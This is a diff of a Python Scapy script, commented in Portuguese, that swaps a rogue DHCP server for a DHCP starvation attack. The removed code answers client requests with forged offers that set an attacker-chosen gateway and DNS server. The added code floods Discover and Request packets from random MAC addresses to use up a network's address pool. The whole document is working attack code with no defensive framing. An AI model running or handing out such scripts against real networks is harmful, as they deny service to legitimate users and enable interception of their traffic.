@@ -1,52 +1,59 @@
 from scapy.all import *
+import time
 
-def rogue_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, router, dns_server):
-    def dhcp_server(pkt):
-        if DHCP in pkt and pkt[DHCP].options[0][1] == 1:  # DHCP Discover
-            print(f"Received DHCP Discover from {pkt[Ether].src}")
+def dhcp_starvation(interface, num_packets, delay):
+    # Desativar a verificação de endereço IP no Scapy
+    conf.checkIPaddr = False
+    
+    # Lista para armazenar os IPs oferecidos
+    offered_ips = []
 
-            # Construir pacote DHCP Offer
-            dhcp_offer = Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff") / \
-                         IP(src=server_ip, dst="255.255.255.255") / \
-                         UDP(sport=67, dport=68) / \
-                         BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
-                         DHCP(options=[
-                             ("message-type", "offer"),
-                             ("subnet_mask", subnet_mask),
-                             ("router", router),
-                             ("dns_server", dns_server),
-                             ("end")
-                         ])
-            sendp(dhcp_offer, iface=interface, verbose=0)
+    # Função para lidar com pacotes DHCP
+    def handle_dhcp(pkt):
+        if DHCP in pkt:
+            if pkt[DHCP].options[0][1] == 2:  # DHCP Offer
+                offered_ips.append(pkt[IP].src)
+                print(f"Received DHCP Offer from {pkt[IP].src}")
 
-        elif DHCP in pkt and pkt[DHCP].options[0][1] == 3:  # DHCP Request
-            print(f"Received DHCP Request from {pkt[Ether].src}")
+    # Fase de Discover
+    for _ in range(num_packets):
+        mac_address = RandMAC()
+        dhcp_discover = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
+                        IP(src="0.0.0.0", dst="255.255.255.255") / \
+                        UDP(sport=68, dport=67) / \
+                        BOOTP(chaddr=mac_address) / \
+                        DHCP(options=[("message-type", "discover"), ("end")])
 
-            # Construir pacote DHCP Acknowledge
-            dhcp_ack = Ether(src=get_if_hwaddr(interface), dst="ff:ff:ff:ff:ff:ff") / \
-                       IP(src=server_ip, dst="255.255.255.255") / \
-                       UDP(sport=67, dport=68) / \
-                       BOOTP(op=2, yiaddr=start_ip, siaddr=server_ip, chaddr=pkt[Ether].src) / \
-                       DHCP(options=[
-                           ("message-type", "ack"),
-                           ("subnet_mask", subnet_mask),
-                           ("router", router),
-                           ("dns_server", dns_server),
-                           ("end")
-                       ])
-            sendp(dhcp_ack, iface=interface, verbose=0)
+        sendp(dhcp_discover, iface=interface, verbose=0)
 
-    print(f"Starting Rogue DHCP Server on interface {interface}...")
-    sniff(filter="udp and (port 67 or 68)", prn=dhcp_server, store=0, iface=interface)
+        time.sleep(delay)
+
+    # Esperar para todas as respostas DHCP Offer
+    time.sleep(2)
+
+    # Fase de Request e ACK
+    for ip in offered_ips:
+        mac_address = RandMAC()
+        dhcp_request = Ether(src=mac_address, dst="ff:ff:ff:ff:ff:ff") / \
+                       IP(src="0.0.0.0", dst="255.255.255.255") / \
+                       UDP(sport=68, dport=67) / \
+                       BOOTP(chaddr=mac_address) / \
+                       DHCP(options=[("message-type", "request"),
+                                     ("requested_addr", ip),
+                                     ("end")])
+
+        sendp(dhcp_request, iface=interface, verbose=0)
+        print(f"Sent DHCP Request for {ip}")
+
+        time.sleep(delay)
+
+        # Aguardar resposta DHCP ACK
+        sniff(filter=f"udp and (port 67 or port 68) and host {ip}", prn=handle_dhcp, timeout=5, iface=interface)
 
 if __name__ == "__main__":
-    interface = "eth0"   # Interface de rede a ser usada para o servidor DHCP malicioso
-    server_ip = "192.168.0.254"  # Endereço IP do servidor DHCP malicioso
-    start_ip = "192.168.0.100"  # Primeiro IP a ser oferecido
-    end_ip = "192.168.0.200"  # Último IP a ser oferecido
-    subnet_mask = "255.255.255.0"  # Máscara de sub-rede
-    router = "192.168.0.1"  # Gateway padrão
-    dns_server = "8.8.8.8"  # Servidor DNS
+    interface = "eth0"   # Interface de rede a ser usada para o ataque
+    num_packets = 10     # Número de pacotes DHCP Discover a serem enviados
+    delay = 0.5          # Atraso entre o envio de cada pacote em segundos
 
-    rogue_dhcp_server(interface, server_ip, start_ip, end_ip, subnet_mask, router, dns_server)
+    dhcp_starvation(interface, num_packets, delay)
 
